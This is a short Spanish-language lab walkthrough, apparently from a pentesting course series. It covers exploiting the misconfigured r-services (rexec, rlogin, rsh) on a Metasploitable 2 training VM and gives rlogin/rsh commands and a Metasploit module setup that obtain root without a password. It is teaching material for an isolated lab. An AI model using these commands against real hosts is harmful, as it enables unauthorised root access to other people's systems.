# Servicios r: exec, login, shell (puertos 512, 513, 514) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** los llamados **r-services** de Unix (`rexec`, `rlogin`, `rsh`) permiten ejecutar comandos y abrir sesiones remotas **sin contraseña** cuando se "confía" en el equipo de origen. Puertos **512 (exec)**, **513 (login)** y **514 (shell)**.

**Cómo se explota:** en Metasploitable están **mal configurados** para confiar en *cualquier* host (archivos `.rhosts` / `hosts.equiv` con `+ +`). Eso permite entrar como `root` directamente, sin credenciales.

## Explotación manual (sin Metasploit)

```bash
# Instalar el cliente (si no lo tienes)
sudo apt install rsh-client -y

# Iniciar sesión como root, sin contraseña
rlogin -l root 192.168.100.9

# O ejecutar un comando suelto
rsh -l root 192.168.100.9 "id"
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/rservices/rlogin_login
set RHOSTS 192.168.100.9
set USERNAME root
run
```
